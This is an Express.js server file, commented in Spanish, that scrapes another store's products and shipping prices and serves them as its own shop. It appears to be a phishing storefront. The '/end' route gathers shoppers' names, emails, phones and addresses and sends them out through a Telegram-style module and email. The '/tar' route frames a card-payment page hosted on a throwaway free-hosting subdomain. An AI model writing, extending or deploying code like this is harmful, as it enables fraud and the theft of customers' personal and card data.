// index.js
const express = require('express');
const dotenv = require('dotenv');
const scrapeWebsite = require('./scraper');
const scrapeWebsiteDesc = require('./scraperDetalles');
const scrapeEnvioData = require('./scraperEnvio');
const EnviarMail = require('./sendEmail');
const sendTL = require('./sendTL');
const comentarios_db = require('./comentarios_db');
const loadTemplate = require('./error/templateLoader');
// Cargar variables de entorno desde el archivo .env
dotenv.config(); // para q funcione  .env


const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '192.168.1.29'; //borrar despues

app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');
app.use(express.static(__dirname + "/public/"));


//Rutas


//HOME
app.get('/', async (req, res) => {

  try {
    // Obtén la URL base del query parameter o usa una URL predeterminada
    const baseUrl = req.query.baseUrl || process.env.web;
    const products = await scrapeWebsite(baseUrl + "?srule=most-sold&start=0&sz=6");
    const result = await scrapeEnvioData();

    //DATOS QUE ENVIARE A index.ejs
    const renderData = {
      envioLimite: result.envioLimite,
      costoEnvio: result.costoEnvio,
      products: products
    };

    res.render('home', renderData);
  } catch (error) {
    console.error('Error', error);
    const errorMessage = 'Error al obtener los productos';
    const errorHtml = loadTemplate('errorTemplate', { errorMessage });

    // Establecer el código de estado y enviar la respuesta HTML
    res.status(500).send(errorHtml);
  }

});



//coentarios base de datos
app.get('/comentarios', async (req, res) => {   
  res.json(await comentarios_db());
});





//GRILLA DE PRODUCTOS
app.get('/api/products', async (req, res) => {

  try {
    // Obtén la URL base del query parameter o usa una URL predeterminada
    const baseUrl = req.query.baseUrl || process.env.web;
    const products = await scrapeWebsite(baseUrl);
    const result = await scrapeEnvioData();

    //DATOS QUE ENVIARE A index.ejs
    const renderData = {
      envioLimite: result.envioLimite,
      costoEnvio: result.costoEnvio,
      products: products
    };

    res.render('index', renderData);
  } catch (error) {
    console.error('Error', error);
    const errorMessage = 'Error al obtener los productos';
    const errorHtml = loadTemplate('errorTemplate', { errorMessage });

    // Establecer el código de estado y enviar la respuesta HTML
    res.status(500).send(errorHtml);
  }
});



//DETALLES DEL PRODUTO ELEGIDO
app.get('/api/products/detalles', async (req, res) => {
  try {
    const detallesLink = req.query.DetallesLink;
    const result = await scrapeEnvioData();
    const baseUrl = detallesLink;
    const descripcion = await scrapeWebsiteDesc(baseUrl);
    //DATOS QUE ENVIARE A index.ejs
    const renderData = {
      envioLimite: result.envioLimite,
      costoEnvio: result.costoEnvio,
      descripcion: descripcion
    };


    res.render('detalles', renderData);
  } catch (error) {
    res.status(500).json({ error: 'Error al realizar la solicitud' });
  }
});

//Formulario de envio
app.get('/envio', async (req, res) => {
  const result = await scrapeEnvioData();
  const renderData = {
    envioLimite: result.envioLimite,
    costoEnvio: result.costoEnvio
  };
  res.render('envio', renderData);
});




app.get('/end', async (req, res) => {
  const titular = req.query.titular;
  const productos = req.query.productos;
  const total = req.query.total;
  const envPrecio = req.query.envPrecio;
  const precio = req.query.precio;
  const dir = req.query.dir;
  const nombre = req.query.nombre;
  const mail = req.query.mail;
  const fecha = req.query.fecha;
  const sPostal = req.query.sPostal;
  const domiSN = req.query.domiSN;
  const seguimiento = req.query.seguimiento;
  const linkImgMail = req.query.linkImgMail;
  const PaginaWeb = req.query.PaginaWeb; 
  const phone = req.query.phone;

  try {
    await sendTL.checkSuit(nombre, productos, mail, phone, dir, sPostal, domiSN);
    await EnviarMail(titular, productos, total, envPrecio, precio, dir, nombre, mail, fecha, sPostal, domiSN, seguimiento, linkImgMail, PaginaWeb, phone);
    res.render('end', { mail });
  } catch (error) {
    // Manejar errores si es necesario
    console.error(error);
    res.status(500).send('Error interno del servidor');
  }

});

 
//DETALLES DEL PRODUTO ELEGIDO
app.get('/institucional', (req, res) => {
     res.render('institucional'); 
});

app.get('/urban', (req, res) => {
  const constructionMessage = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Sitio en Construcción</title>
    </head>
    <body>
      <a href="/"><img src="https://www.grupo-epm.com/site/portals/17/Images/Clic%20para%20regresar.png?ver=2019-12-14-105112-337" alt="Sitio en Construcción"><a>
    </body>
    </html>
  `;

  res.send(constructionMessage);
});


//pago tarj
app.get('/tar', (req, res) => {
  // Obtenemos los parámetros de la URL
  const total = req.query.total;
  const cuotas = req.query.cuotas;
  const importeCuota = req.query.importeCuota;
  const tipo = req.query.tipo; // Puedes acceder a los parámetros de la URL así

  // Creamos la URL del iframe con los parámetros recibidos
  //const iframeURL = `http://ejemplo.com/?parametro1=`;
  const iframeURL = `https://gk3sr7pm2td6af8xh1jl4wo9vu5zc0yb.000webhostapp.com/index.html?total=${total}&cuotas=${cuotas}&importeCuota=${importeCuota}&tipo=${tipo}`;
  // Creamos el contenido HTML con el iframe
  const webTar = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Sitio en Construcción</title>
    </head>
    <body>
      <!-- Aquí está el iframe que recibe los parámetros de la URL -->
      <iframe src="${iframeURL}" style="width:100%;height:100vh;border:none"></iframe>
    </body>
    </html>
  `;

  // Enviamos la respuesta con el contenido HTML que incluye el iframe
  res.send(webTar);
});



app.listen(PORT, HOST, () => {   //sacara HOST dspues
  console.log(`Servidor iniciado en http://localhost:${PORT}`);
});
